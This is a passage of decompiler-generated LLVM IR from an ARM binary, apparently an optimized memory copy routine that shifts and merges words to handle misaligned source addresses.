  %v2_169a4 = icmp eq i32 %v1_169a4, 0
  store i1 %v2_169a4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_169a4 to i2
  br i1 %v2_169a4, label %dec_label_pc_168d8, label %dec_label_pc_169ac

dec_label_pc_169ac:                               ; preds = %dec_label_pc_168d0, %dec_label_pc_169a4
  %v0_16acc76 = phi i32 [ %v1_168b0, %dec_label_pc_168d0 ], [ %v0_16acc77, %dec_label_pc_169a4 ]
  %v0_16a34 = phi i32 [ %v2_168c0, %dec_label_pc_168d0 ], [ %v2_1699c, %dec_label_pc_169a4 ]
  %v0_169b4.off0 = phi i2 [ %extract.t, %dec_label_pc_168d0 ], [ %extract.t131, %dec_label_pc_169a4 ]
  %v0_169ac = phi i32 [ %v0_168b0, %dec_label_pc_168d0 ], [ %v0_169a4, %dec_label_pc_169a4 ]
  %v1_169ac = and i32 %v0_169ac, -4
  store i32 %v1_169ac, i32* %r1.global-to-local, align 4
  %v1_169b0 = inttoptr i32 %v1_169ac to i32*
  %v2_169b0 = load i32, i32* %v1_169b0, align 4
  store i32 %v2_169b0, i32* %lr.global-to-local, align 4
  %v4_169b0 = add i32 %v1_169ac, 4
  store i32 %v4_169b0, i32* %r1.global-to-local, align 4
  %v1_16a2c = add i32 %v0_16a34, -12
  %v3_16a2c = sub i32 11, %v0_16a34
  %v4_16a2c = and i32 %v3_16a2c, %v0_16a34
  %v5_16a2c = icmp slt i32 %v4_16a2c, 0
  store i1 %v5_16a2c, i1* %cpsr_v.global-to-local, align 1
  %v6_16a2c = icmp slt i32 %v1_16a2c, 0
  store i1 %v6_16a2c, i1* %cpsr_n.global-to-local, align 1
  %v7_16a2c = icmp eq i32 %v0_16a34, 12
  store i1 %v7_16a2c, i1* %cpsr_z.global-to-local, align 1
  %v2_16a30 = xor i1 %v6_16a2c, %v5_16a2c
  switch i2 %v0_169b4.off0, label %dec_label_pc_169c0 [
    i2 -1, label %dec_label_pc_16a98
    i2 -2, label %dec_label_pc_16a2c
  ]

dec_label_pc_169c0:                               ; preds = %dec_label_pc_169ac
  br i1 %v2_16a30, label %dec_label_pc_16a0c, label %dec_label_pc_169c8

dec_label_pc_169c8:                               ; preds = %dec_label_pc_169c0
  store i32 %v1_16a2c, i32* %r2.global-to-local, align 4
  %v3_169cc = load i32, i32* @r4, align 4
  store i32 %v3_169cc, i32* %stack_var_-16, align 4
  %v6_169cc = load i32, i32* @r5, align 4
  store i32 %v6_169cc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_169d0

dec_label_pc_169d0:                               ; preds = %dec_label_pc_169d0.dec_label_pc_169d0_crit_edge, %dec_label_pc_169c8
  %v0_169f4 = phi i32 [ %v12_169f4, %dec_label_pc_169d0.dec_label_pc_169d0_crit_edge ], [ %v0_16acc76, %dec_label_pc_169c8 ]
  %v0_169d4 = phi i32 [ %v0_169d4.pre, %dec_label_pc_169d0.dec_label_pc_169d0_crit_edge ], [ %v4_169b0, %dec_label_pc_169c8 ]
  %v0_169d0 = phi i32 [ %v0_169d0.pre, %dec_label_pc_169d0.dec_label_pc_169d0_crit_edge ], [ %v2_169b0, %dec_label_pc_169c8 ]
  %v3_169d0 = udiv i32 %v0_169d0, 256
  %v1_169d4 = inttoptr i32 %v0_169d4 to i32*
  %v2_169d4 = load i32, i32* %v1_169d4, align 4
  store i32 %v2_169d4, i32* %r4.global-to-local, align 4
  %v3_169d4 = add i32 %v0_169d4, 4
  %v4_169d4 = inttoptr i32 %v3_169d4 to i32*
  %v5_169d4 = load i32, i32* %v4_169d4, align 4
  store i32 %v5_169d4, i32* %r5.global-to-local, align 4
  %v6_169d4 = add i32 %v0_169d4, 8
  %v7_169d4 = inttoptr i32 %v6_169d4 to i32*
  %v8_169d4 = load i32, i32* %v7_169d4, align 4
  store i32 %v8_169d4, i32* %ip.global-to-local, align 4
  %v9_169d4 = add i32 %v0_169d4, 12
  %v10_169d4 = inttoptr i32 %v9_169d4 to i32*
  %v11_169d4 = load i32, i32* %v10_169d4, align 4
  store i32 %v11_169d4, i32* %lr.global-to-local, align 4
  %v12_169d4 = add i32 %v0_169d4, 16
  store i32 %v12_169d4, i32* %r1.global-to-local, align 4
  %v4_169d8 = mul i32 %v2_169d4, 16777216
  %v5_169d8 = or i32 %v4_169d8, %v3_169d0
  store i32 %v5_169d8, i32* @r3, align 4
  %v3_169dc = udiv i32 %v2_169d4, 256
  %v4_169e0 = mul i32 %v5_169d4, 16777216
  %v5_169e0 = or i32 %v4_169e0, %v3_169dc
  store i32 %v5_169e0, i32* %r4.global-to-local, align 4
  %v3_169e4 = udiv i32 %v5_169d4, 256
  %v4_169e8 = mul i32 %v8_169d4, 16777216
  %v5_169e8 = or i32 %v4_169e8, %v3_169e4
  store i32 %v5_169e8, i32* %r5.global-to-local, align 4
  %v3_169ec = udiv i32 %v8_169d4, 256
  %v4_169f0 = mul i32 %v11_169d4, 16777216
  %v5_169f0 = or i32 %v4_169f0, %v3_169ec
  store i32 %v5_169f0, i32* @ip, align 4
  %v1_169f4 = inttoptr i32 %v0_169f4 to i32*
  store i32 %v5_169d8, i32* %v1_169f4, align 4
  %v3_169f4 = add i32 %v0_169f4, 4
  %v4_169f4 = inttoptr i32 %v3_169f4 to i32*
  %v5_169f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_169f4, i32* %v4_169f4, align 4
  %v6_169f4 = add i32 %v0_169f4, 8
  %v7_169f4 = inttoptr i32 %v6_169f4 to i32*
  %v8_169f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_169f4, i32* %v7_169f4, align 4
  %v9_169f4 = add i32 %v0_169f4, 12
  %v10_169f4 = inttoptr i32 %v9_169f4 to i32*
  %v11_169f4 = load i32, i32* @ip, align 4
  store i32 %v11_169f4, i32* %v10_169f4, align 4
  %v12_169f4 = add i32 %v0_169f4, 16
  store i32 %v12_169f4, i32* @r0, align 4
  %v0_169f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_169f8 = add i32 %v0_169f8, -16
  store i32 %v1_169f8, i32* %r2.global-to-local, align 4
  %v3_169f8 = sub i32 15, %v0_169f8
  %v4_169f8 = and i32 %v3_169f8, %v0_169f8
  %v5_169f8 = icmp slt i32 %v4_169f8, 0
  %v6_169f8 = icmp slt i32 %v1_169f8, 0
  %v2_169fc = xor i1 %v6_169f8, %v5_169f8
  br i1 %v2_169fc, label %dec_label_pc_16a00, label %dec_label_pc_169d0.dec_label_pc_169d0_crit_edge

dec_label_pc_169d0.dec_label_pc_169d0_crit_edge:  ; preds = %dec_label_pc_169d0
  %v0_169d0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_169d4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_169d0

dec_label_pc_16a00:                               ; preds = %dec_label_pc_169d0
  %v2_16a00 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16a00, i32* @r4, align 4
  %v5_16a00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16a00, i32* @r5, align 4
  %v1_16a04 = add i32 %v0_169f8, -4
  store i32 %v1_16a04, i32* %r2.global-to-local, align 4
  %v3_16a04 = add i32 %v0_169f8, 2147483632
  %v4_16a04 = and i32 %v1_16a04, %v3_16a04
  %v5_16a04 = icmp slt i32 %v4_16a04, 0
  store i1 %v5_16a04, i1* %cpsr_v.global-to-local, align 1
  %v6_16a04 = icmp slt i32 %v1_16a04, 0
  store i1 %v6_16a04, i1* %cpsr_n.global-to-local, align 1
  %v7_16a04 = icmp eq i32 %v1_16a04, 0
  store i1 %v7_16a04, i1* %cpsr_z.global-to-local, align 1
  %v2_16a08 = xor i1 %v6_16a04, %v5_16a04
  br i1 %v2_16a08, label %dec_label_pc_16a24, label %dec_label_pc_16a0c

dec_label_pc_16a0c:                               ; preds = %dec_label_pc_16a00, %dec_label_pc_169c0, %dec_label_pc_16a0c
  %v1_16a18 = phi i32 [ %v4_16a18, %dec_label_pc_16a0c ], [ %v12_169f4, %dec_label_pc_16a00 ], [ %v0_16acc76, %dec_label_pc_169c0 ]
  %v0_16a0c = load i32, i32* %lr.global-to-local, align 4
  %v3_16a0c = udiv i32 %v0_16a0c, 256
  store i32 %v3_16a0c, i32* %ip.global-to-local, align 4
  %v0_16a10 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a10 = inttoptr i32 %v0_16a10 to i32*
  %v2_16a10 = load i32, i32* %v1_16a10, align 4
  store i32 %v2_16a10, i32* %lr.global-to-local, align 4
  %v4_16a10 = add i32 %v0_16a10, 4
  store i32 %v4_16a10, i32* %r1.global-to-local, align 4
  %v4_16a14 = mul i32 %v2_16a10, 16777216
  %v5_16a14 = or i32 %v4_16a14, %v3_16a0c
  store i32 %v5_16a14, i32* @ip, align 4
  %v2_16a18 = inttoptr i32 %v1_16a18 to i32*
  store i32 %v5_16a14, i32* %v2_16a18, align 4
  %v3_16a18 = load i32, i32* @r0, align 4
  %v4_16a18 = add i32 %v3_16a18, 4
  store i32 %v4_16a18, i32* @r0, align 4
  %v0_16a1c = load i32, i32* %r2.global-to-local, align 4
  %v1_16a1c = add i32 %v0_16a1c, -4
  store i32 %v1_16a1c, i32* %r2.global-to-local, align 4
  %v3_16a1c = sub i32 3, %v0_16a1c
  %v4_16a1c = and i32 %v3_16a1c, %v0_16a1c
  %v5_16a1c = icmp slt i32 %v4_16a1c, 0
  %v6_16a1c = icmp slt i32 %v1_16a1c, 0
  %v2_16a20 = xor i1 %v6_16a1c, %v5_16a1c
  br i1 %v2_16a20, label %dec_label_pc_16a24.loopexit, label %dec_label_pc_16a0c

dec_label_pc_16a24.loopexit:                      ; preds = %dec_label_pc_16a0c
  %v7_16a1c = icmp eq i32 %v0_16a1c, 4
  store i1 %v5_16a1c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16a1c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16a1c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16a24

dec_label_pc_16a24:                               ; preds = %dec_label_pc_16a24.loopexit, %dec_label_pc_16a00
  %v0_1694c59 = phi i32 [ %v1_16a1c, %dec_label_pc_16a24.loopexit ], [ %v1_16a04, %dec_label_pc_16a00 ]
  %v0_16a24 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a24 = add i32 %v0_16a24, -3
  store i32 %v1_16a24, i32* @r1, align 4
  br label %bb140

dec_label_pc_16a2c:                               ; preds = %dec_label_pc_169ac
  br i1 %v2_16a30, label %dec_label_pc_16a78, label %dec_label_pc_16a34

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16a2c
  store i32 %v1_16a2c, i32* %r2.global-to-local, align 4
  %v3_16a38 = load i32, i32* @r4, align 4
  store i32 %v3_16a38, i32* %stack_var_-16, align 4
  %v6_16a38 = load i32, i32* @r5, align 4
  store i32 %v6_16a38, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16a3c

dec_label_pc_16a3c:                               ; preds = %dec_label_pc_16a3c.dec_label_pc_16a3c_crit_edge, %dec_label_pc_16a34
  %v0_16a60 = phi i32 [ %v12_16a60, %dec_label_pc_16a3c.dec_label_pc_16a3c_crit_edge ], [ %v0_16acc76, %dec_label_pc_16a34 ]
  %v0_16a40 = phi i32 [ %v0_16a40.pre, %dec_label_pc_16a3c.dec_label_pc_16a3c_crit_edge ], [ %v4_169b0, %dec_label_pc_16a34 ]
  %v0_16a3c = phi i32 [ %v0_16a3c.pre, %dec_label_pc_16a3c.dec_label_pc_16a3c_crit_edge ], [ %v2_169b0, %dec_label_pc_16a34 ]
  %v3_16a3c = udiv i32 %v0_16a3c, 65536
  %v1_16a40 = inttoptr i32 %v0_16a40 to i32*
  %v2_16a40 = load i32, i32* %v1_16a40, align 4
  store i32 %v2_16a40, i32* %r4.global-to-local, align 4
  %v3_16a40 = add i32 %v0_16a40, 4
  %v4_16a40 = inttoptr i32 %v3_16a40 to i32*
  %v5_16a40 = load i32, i32* %v4_16a40, align 4
  store i32 %v5_16a40, i32* %r5.global-to-local, align 4
  %v6_16a40 = add i32 %v0_16a40, 8
  %v7_16a40 = inttoptr i32 %v6_16a40 to i32*
  %v8_16a40 = load i32, i32* %v7_16a40, align 4
  store i32 %v8_16a40, i32* %ip.global-to-local, align 4
  %v9_16a40 = add i32 %v0_16a40, 12
  %v10_16a40 = inttoptr i32 %v9_16a40 to i32*
  %v11_16a40 = load i32, i32* %v10_16a40, align 4
  store i32 %v11_16a40, i32* %lr.global-to-local, align 4
  %v12_16a40 = add i32 %v0_16a40, 16
  store i32 %v12_16a40, i32* %r1.global-to-local, align 4
  %v4_16a44 = mul i32 %v2_16a40, 65536
  %v5_16a44 = or i32 %v4_16a44, %v3_16a3c
  store i32 %v5_16a44, i32* @r3, align 4
  %v3_16a48 = udiv i32 %v2_16a40, 65536
  %v4_16a4c = mul i32 %v5_16a40, 65536
  %v5_16a4c = or i32 %v4_16a4c, %v3_16a48
  store i32 %v5_16a4c, i32* %r4.global-to-local, align 4
  %v3_16a50 = udiv i32 %v5_16a40, 65536
  %v4_16a54 = mul i32 %v8_16a40, 65536
  %v5_16a54 = or i32 %v4_16a54, %v3_16a50
  store i32 %v5_16a54, i32* %r5.global-to-local, align 4
  %v3_16a58 = udiv i32 %v8_16a40, 65536
  %v4_16a5c = mul i32 %v11_16a40, 65536
  %v5_16a5c = or i32 %v4_16a5c, %v3_16a58
  store i32 %v5_16a5c, i32* @ip, align 4
  %v1_16a60 = inttoptr i32 %v0_16a60 to i32*
  store i32 %v5_16a44, i32* %v1_16a60, align 4
  %v3_16a60 = add i32 %v0_16a60, 4
  %v4_16a60 = inttoptr i32 %v3_16a60 to i32*
  %v5_16a60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16a60, i32* %v4_16a60, align 4
  %v6_16a60 = add i32 %v0_16a60, 8
  %v7_16a60 = inttoptr i32 %v6_16a60 to i32*
  %v8_16a60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16a60, i32* %v7_16a60, align 4
  %v9_16a60 = add i32 %v0_16a60, 12
  %v10_16a60 = inttoptr i32 %v9_16a60 to i32*
  %v11_16a60 = load i32, i32* @ip, align 4
  store i32 %v11_16a60, i32* %v10_16a60, align 4
  %v12_16a60 = add i32 %v0_16a60, 16
  store i32 %v12_16a60, i32* @r0, align 4
  %v0_16a64 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a64 = add i32 %v0_16a64, -16
  store i32 %v1_16a64, i32* %r2.global-to-local, align 4
  %v3_16a64 = sub i32 15, %v0_16a64
  %v4_16a64 = and i32 %v3_16a64, %v0_16a64
  %v5_16a64 = icmp slt i32 %v4_16a64, 0
  %v6_16a64 = icmp slt i32 %v1_16a64, 0
  %v2_16a68 = xor i1 %v6_16a64, %v5_16a64
  br i1 %v2_16a68, label %dec_label_pc_16a6c, label %dec_label_pc_16a3c.dec_label_pc_16a3c_crit_edge

dec_label_pc_16a3c.dec_label_pc_16a3c_crit_edge:  ; preds = %dec_label_pc_16a3c
  %v0_16a3c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16a40.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16a3c

dec_label_pc_16a6c:                               ; preds = %dec_label_pc_16a3c
  %v2_16a6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16a6c, i32* @r4, align 4
  %v5_16a6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16a6c, i32* @r5, align 4
  %v1_16a70 = add i32 %v0_16a64, -4
  store i32 %v1_16a70, i32* %r2.global-to-local, align 4
  %v3_16a70 = add i32 %v0_16a64, 2147483632
  %v4_16a70 = and i32 %v1_16a70, %v3_16a70
  %v5_16a70 = icmp slt i32 %v4_16a70, 0
  store i1 %v5_16a70, i1* %cpsr_v.global-to-local, align 1
  %v6_16a70 = icmp slt i32 %v1_16a70, 0
  store i1 %v6_16a70, i1* %cpsr_n.global-to-local, align 1
  %v7_16a70 = icmp eq i32 %v1_16a70, 0
  store i1 %v7_16a70, i1* %cpsr_z.global-to-local, align 1
  %v2_16a74 = xor i1 %v6_16a70, %v5_16a70
  br i1 %v2_16a74, label %dec_label_pc_16a90, label %dec_label_pc_16a78

dec_label_pc_16a78:                               ; preds = %dec_label_pc_16a6c, %dec_label_pc_16a2c, %dec_label_pc_16a78
  %v1_16a84 = phi i32 [ %v4_16a84, %dec_label_pc_16a78 ], [ %v12_16a60, %dec_label_pc_16a6c ], [ %v0_16acc76, %dec_label_pc_16a2c ]
  %v0_16a78 = load i32, i32* %lr.global-to-local, align 4
  %v3_16a78 = udiv i32 %v0_16a78, 65536
  store i32 %v3_16a78, i32* %ip.global-to-local, align 4
  %v0_16a7c = load i32, i32* %r1.global-to-local, align 4
  %v1_16a7c = inttoptr i32 %v0_16a7c to i32*
  %v2_16a7c = load i32, i32* %v1_16a7c, align 4
  store i32 %v2_16a7c, i32* %lr.global-to-local, align 4
  %v4_16a7c = add i32 %v0_16a7c, 4
  store i32 %v4_16a7c, i32* %r1.global-to-local, align 4
  %v4_16a80 = mul i32 %v2_16a7c, 65536
  %v5_16a80 = or i32 %v4_16a80, %v3_16a78
  store i32 %v5_16a80, i32* @ip, align 4
  %v2_16a84 = inttoptr i32 %v1_16a84 to i32*
  store i32 %v5_16a80, i32* %v2_16a84, align 4
  %v3_16a84 = load i32, i32* @r0, align 4
  %v4_16a84 = add i32 %v3_16a84, 4
  store i32 %v4_16a84, i32* @r0, align 4
  %v0_16a88 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a88 = add i32 %v0_16a88, -4
  store i32 %v1_16a88, i32* %r2.global-to-local, align 4
  %v3_16a88 = sub i32 3, %v0_16a88
  %v4_16a88 = and i32 %v3_16a88, %v0_16a88
  %v5_16a88 = icmp slt i32 %v4_16a88, 0
  %v6_16a88 = icmp slt i32 %v1_16a88, 0
  %v2_16a8c = xor i1 %v6_16a88, %v5_16a88
  br i1 %v2_16a8c, label %dec_label_pc_16a90.loopexit, label %dec_label_pc_16a78

dec_label_pc_16a90.loopexit:                      ; preds = %dec_label_pc_16a78
  %v7_16a88 = icmp eq i32 %v0_16a88, 4
  store i1 %v5_16a88, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16a88, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16a88, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16a90

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a90.loopexit, %dec_label_pc_16a6c
  %v0_1694c60 = phi i32 [ %v1_16a88, %dec_label_pc_16a90.loopexit ], [ %v1_16a70, %dec_label_pc_16a6c ]
  %v0_16a90 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a90 = add i32 %v0_16a90, -2
  store i32 %v1_16a90, i32* @r1, align 4
  br label %bb140

dec_label_pc_16a98:                               ; preds = %dec_label_pc_169ac
  br i1 %v2_16a30, label %dec_label_pc_16ae4, label %dec_label_pc_16aa0

dec_label_pc_16aa0:                               ; preds = %dec_label_pc_16a98
  store i32 %v1_16a2c, i32* %r2.global-to-local, align 4
  %v3_16aa4 = load i32, i32* @r4, align 4
  store i32 %v3_16aa4, i32* %stack_var_-16, align 4
  %v6_16aa4 = load i32, i32* @r5, align 4
  store i32 %v6_16aa4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16aa8

dec_label_pc_16aa8:                               ; preds = %dec_label_pc_16aa8.dec_label_pc_16aa8_crit_edge, %dec_label_pc_16aa0
  %v0_16acc = phi i32 [ %v12_16acc, %dec_label_pc_16aa8.dec_label_pc_16aa8_crit_edge ], [ %v0_16acc76, %dec_label_pc_16aa0 ]
  %v0_16aac = phi i32 [ %v0_16aac.pre, %dec_label_pc_16aa8.dec_label_pc_16aa8_crit_edge ], [ %v4_169b0, %dec_label_pc_16aa0 ]
  %v0_16aa8 = phi i32 [ %v0_16aa8.pre, %dec_label_pc_16aa8.dec_label_pc_16aa8_crit_edge ], [ %v2_169b0, %dec_label_pc_16aa0 ]
  %v3_16aa8 = udiv i32 %v0_16aa8, 16777216
  %v1_16aac = inttoptr i32 %v0_16aac to i32*
  %v2_16aac = load i32, i32* %v1_16aac, align 4
  store i32 %v2_16aac, i32* %r4.global-to-local, align 4
  %v3_16aac = add i32 %v0_16aac, 4
  %v4_16aac = inttoptr i32 %v3_16aac to i32*
  %v5_16aac = load i32, i32* %v4_16aac, align 4
  store i32 %v5_16aac, i32* %r5.global-to-local, align 4
  %v6_16aac = add i32 %v0_16aac, 8
  %v7_16aac = inttoptr i32 %v6_16aac to i32*
  %v8_16aac = load i32, i32* %v7_16aac, align 4
  store i32 %v8_16aac, i32* %ip.global-to-local, align 4
  %v9_16aac = add i32 %v0_16aac, 12
  %v10_16aac = inttoptr i32 %v9_16aac to i32*
  %v11_16aac = load i32, i32* %v10_16aac, align 4
  store i32 %v11_16aac, i32* %lr.global-to-local, align 4
  %v12_16aac = add i32 %v0_16aac, 16
  store i32 %v12_16aac, i32* %r1.global-to-local, align 4
  %v4_16ab0 = mul i32 %v2_16aac, 256
  %v5_16ab0 = or i32 %v4_16ab0, %v3_16aa8
  store i32 %v5_16ab0, i32* @r3, align 4
  %v3_16ab4 = udiv i32 %v2_16aac, 16777216
  %v4_16ab8 = mul i32 %v5_16aac, 256
  %v5_16ab8 = or i32 %v4_16ab8, %v3_16ab4
  store i32 %v5_16ab8, i32* %r4.global-to-local, align 4
  %v3_16abc = udiv i32 %v5_16aac, 16777216
  %v4_16ac0 = mul i32 %v8_16aac, 256
  %v5_16ac0 = or i32 %v4_16ac0, %v3_16abc
  store i32 %v5_16ac0, i32* %r5.global-to-local, align 4
  %v3_16ac4 = udiv i32 %v8_16aac, 16777216
  %v4_16ac8 = mul i32 %v11_16aac, 256
  %v5_16ac8 = or i32 %v4_16ac8, %v3_16ac4
  store i32 %v5_16ac8, i32* @ip, align 4
  %v1_16acc = inttoptr i32 %v0_16acc to i32*
  store i32 %v5_16ab0, i32* %v1_16acc, align 4
  %v3_16acc = add i32 %v0_16acc, 4
  %v4_16acc = inttoptr i32 %v3_16acc to i32*
  %v5_16acc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16acc, i32* %v4_16acc, align 4
  %v6_16acc = add i32 %v0_16acc, 8
  %v7_16acc = inttoptr i32 %v6_16acc to i32*
  %v8_16acc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16acc, i32* %v7_16acc, align 4
  %v9_16acc = add i32 %v0_16acc, 12
  %v10_16acc = inttoptr i32 %v9_16acc to i32*
  %v11_16acc = load i32, i32* @ip, align 4
  store i32 %v11_16acc, i32* %v10_16acc, align 4
  %v12_16acc = add i32 %v0_16acc, 16
  store i32 %v12_16acc, i32* @r0, align 4
  %v0_16ad0 = load i32, i32* %r2.global-to-local, align 4
  %v1_16ad0 = add i32 %v0_16ad0, -16
  store i32 %v1_16ad0, i32* %r2.global-to-local, align 4
  %v3_16ad0 = sub i32 15, %v0_16ad0
  %v4_16ad0 = and i32 %v3_16ad0, %v0_16ad0
  %v5_16ad0 = icmp slt i32 %v4_16ad0, 0
  %v6_16ad0 = icmp slt i32 %v1_16ad0, 0
  %v2_16ad4 = xor i1 %v6_16ad0, %v5_16ad0
  br i1 %v2_16ad4, label %dec_label_pc_16ad8, label %dec_label_pc_16aa8.dec_label_pc_16aa8_crit_edge

dec_label_pc_16aa8.dec_label_pc_16aa8_crit_edge:  ; preds = %dec_label_pc_16aa8
  %v0_16aa8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16aac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16aa8

dec_label_pc_16ad8:                               ; preds = %dec_label_pc_16aa8
  %v2_16ad8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16ad8, i32* @r4, align 4
  %v5_16ad8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16ad8, i32* @r5, align 4
  %v1_16adc = add i32 %v0_16ad0, -4
  store i32 %v1_16adc, i32* %r2.global-to-local, align 4
  %v3_16adc = add i32 %v0_16ad0, 2147483632
  %v4_16adc = and i32 %v1_16adc, %v3_16adc
  %v5_16adc = icmp slt i32 %v4_16adc, 0
  store i1 %v5_16adc, i1* %cpsr_v.global-to-local, align 1
  %v6_16adc = icmp slt i32 %v1_16adc, 0
  store i1 %v6_16adc, i1* %cpsr_n.global-to-local, align 1
  %v7_16adc = icmp eq i32 %v1_16adc, 0
  store i1 %v7_16adc, i1* %cpsr_z.global-to-local, align 1
  %v2_16ae0 = xor i1 %v6_16adc, %v5_16adc
  br i1 %v2_16ae0, label %dec_label_pc_16afc, label %dec_label_pc_16ae4

dec_label_pc_16ae4:                               ; preds = %dec_label_pc_16ad8, %dec_label_pc_16a98, %dec_label_pc_16ae4
  %v1_16af0 = phi i32 [ %v4_16af0, %dec_label_pc_16ae4 ], [ %v12_16acc, %dec_label_pc_16ad8 ], [ %v0_16acc76, %dec_label_pc_16a98 ]
  %v0_16ae4 = load i32, i32* %lr.global-to-local, align 4
  %v3_16ae4 = udiv i32 %v0_16ae4, 16777216
  store i32 %v3_16ae4, i32* %ip.global-to-local, align 4
  %v0_16ae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ae8 = inttoptr i32 %v0_16ae8 to i32*
  %v2_16ae8 = load i32, i32* %v1_16ae8, align 4
  store i32 %v2_16ae8, i32* %lr.global-to-local, align 4
  %v4_16ae8 = add i32 %v0_16ae8, 4
  store i32 %v4_16ae8, i32* %r1.global-to-local, align 4
  %v4_16aec = mul i32 %v2_16ae8, 256
  %v5_16aec = or i32 %v4_16aec, %v3_16ae4
  store i32 %v5_16aec, i32* @ip, align 4
  %v2_16af0 = inttoptr i32 %v1_16af0 to i32*
  store i32 %v5_16aec, i32* %v2_16af0, align 4
  %v3_16af0 = load i32, i32* @r0, align 4
  %v4_16af0 = add i32 %v3_16af0, 4
  store i32 %v4_16af0, i32* @r0, align 4
  %v0_16af4 = load i32, i32* %r2.global-to-local, align 4
  %v1_16af4 = add i32 %v0_16af4, -4
  store i32 %v1_16af4, i32* %r2.global-to-local, align 4
  %v3_16af4 = sub i32 3, %v0_16af4
  %v4_16af4 = and i32 %v3_16af4, %v0_16af4
  %v5_16af4 = icmp slt i32 %v4_16af4, 0
  %v6_16af4 = icmp slt i32 %v1_16af4, 0
  %v2_16af8 = xor i1 %v6_16af4, %v5_16af4
  br i1 %v2_16af8, label %dec_label_pc_16afc.loopexit, label %dec_label_pc_16ae4

dec_label_pc_16afc.loopexit:                      ; preds = %dec_label_pc_16ae4
  %v7_16af4 = icmp eq i32 %v0_16af4, 4
  store i1 %v5_16af4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16af4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16af4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16afc

dec_label_pc_16afc:                               ; preds = %dec_label_pc_16afc.loopexit, %dec_label_pc_16ad8
  %v0_1694c61 = phi i32 [ %v1_16af4, %dec_label_pc_16afc.loopexit ], [ %v1_16adc, %dec_label_pc_16ad8 ]
  %v0_16afc = load i32, i32* %r1.global-to-local, align 4
  %v1_16afc = add i32 %v0_16afc, -1
  store i32 %v1_16afc, i32* @r1, align 4
  br label %bb140

dec_label_pc_16b04:                               ; preds = %entry
  %v1_16b04 = load i32, i32* @r2, align 4
  %v2_16b04 = add i32 %v1_16b04, %v0_168b0
  store i32 %v2_16b04, i32* %r1.global-to-local, align 4
  %v2_16b08 = add i32 %v1_16b04, %v1_168b0
  store i32 %v2_16b08, i32* %r0.global-to-local, align 4
  %v2_16b0c = add i32 %v1_16b04, -4
  store i32 %v2_16b0c, i32* %r2.global-to-local, align 4
  %v4_16b0c = sub i32 3, %v1_16b04
  %v5_16b0c = and i32 %v4_16b0c, %v1_16b04
  %v6_16b0c = icmp slt i32 %v5_16b0c, 0
  store i1 %v6_16b0c, i1* %cpsr_v.global-to-local, align 1
  %v7_16b0c = icmp slt i32 %v2_16b0c, 0
  store i1 %v7_16b0c, i1* %cpsr_n.global-to-local, align 1
  %v8_16b0c = icmp eq i32 %v1_16b04, 4
  store i1 %v8_16b0c, i1* %cpsr_z.global-to-local, align 1
  %v5_16b10 = icmp slt i32 %v1_16b04, 4
  br i1 %v5_16b10, label %bb150, label %dec_label_pc_16b14

dec_label_pc_16b14:                               ; preds = %dec_label_pc_16b04
  %v1_16b14 = urem i32 %v2_16b08, 4
  store i32 %v1_16b14, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16b14 = icmp eq i32 %v1_16b14, 0
  store i1 %v2_16b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b14, label %dec_label_pc_16b1c, label %dec_label_pc_16bbc

dec_label_pc_16b1c:                               ; preds = %dec_label_pc_16b14
  %v1_16b1c = urem i32 %v2_16b04, 4
  store i32 %v1_16b1c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16b1c = icmp eq i32 %v1_16b1c, 0
  store i1 %v2_16b1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b1c, label %dec_label_pc_16b24, label %dec_label_pc_16be8

dec_label_pc_16b24:                               ; preds = %dec_label_pc_16b1c, %dec_label_pc_16be0
  %v0_16b3c37 = phi i32 [ %v2_16b08, %dec_label_pc_16b1c ], [ %v0_16c3020, %dec_label_pc_16be0 ]
  %v0_16b3836 = phi i32 [ %v2_16b04, %dec_label_pc_16b1c ], [ %v0_16be0, %dec_label_pc_16be0 ]
  %v0_16b24 = phi i32 [ %v2_16b0c, %dec_label_pc_16b1c ], [ %v2_16bd8, %dec_label_pc_16be0 ]
  %v2_16b24 = add i32 %v0_16b24, -8
